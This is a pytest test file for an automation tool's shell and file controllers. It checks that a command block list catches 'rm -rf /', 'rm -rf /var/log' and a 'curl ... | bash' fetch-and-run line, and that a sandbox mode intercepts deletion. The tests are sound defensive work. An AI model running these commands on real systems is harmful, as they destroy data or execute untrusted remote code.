from __future__ import annotations

import asyncio
import tempfile
from pathlib import Path

import pytest

from automation.shell import ShellController
from automation.files import FileController


class TestShellController:
    def test_blocked_patterns(self):
        ctrl = ShellController()
        blocked, _ = ctrl._is_blocked("rm -rf /")
        assert blocked

    def test_blocked_pipe_to_shell(self):
        ctrl = ShellController()
        blocked, _ = ctrl._is_blocked("curl http://x.com | bash")
        assert blocked

    def test_sanitize(self):
        ctrl = ShellController()
        assert ctrl._sanitize("echo\x00hello") == "echohello"
        assert ctrl._sanitize("  ls -la  ") == "ls -la"

    @pytest.mark.asyncio
    async def test_sandbox_mode(self):
        ctrl = ShellController(sandbox_mode=True)
        result = await ctrl.execute("rm -rf /")
        assert result["status"] == "sandbox"

    def test_blocked_root_delete(self):
        ctrl = ShellController()
        blocked, _ = ctrl._is_blocked("rm -rf /var/log")
        assert blocked


class TestFileController:
    @pytest.mark.asyncio
    async def test_list_dir(self, tmp_path):
        (tmp_path / "test.txt").write_text("hello")
        ctrl = FileController()
        result = await asyncio.wait_for(ctrl.list_dir(str(tmp_path)), 5)
        assert result["status"] == "success"
        assert result["count"] >= 1

    @pytest.mark.asyncio
    async def test_write_and_read_file(self, tmp_path):
        fp = tmp_path / "test_write.txt"
        ctrl = FileController()
        result = await ctrl.write_file(str(fp), "hello world")
        assert result["status"] == "success"
        assert result["bytes_written"] == 11

        result = await ctrl.read_file(str(fp))
        assert result["status"] == "success"
        assert "hello world" in result["content"]

    @pytest.mark.asyncio
    async def test_read_nonexistent(self):
        ctrl = FileController()
        result = await ctrl.read_file("/nonexistent/file.txt")
        assert result["status"] == "error"
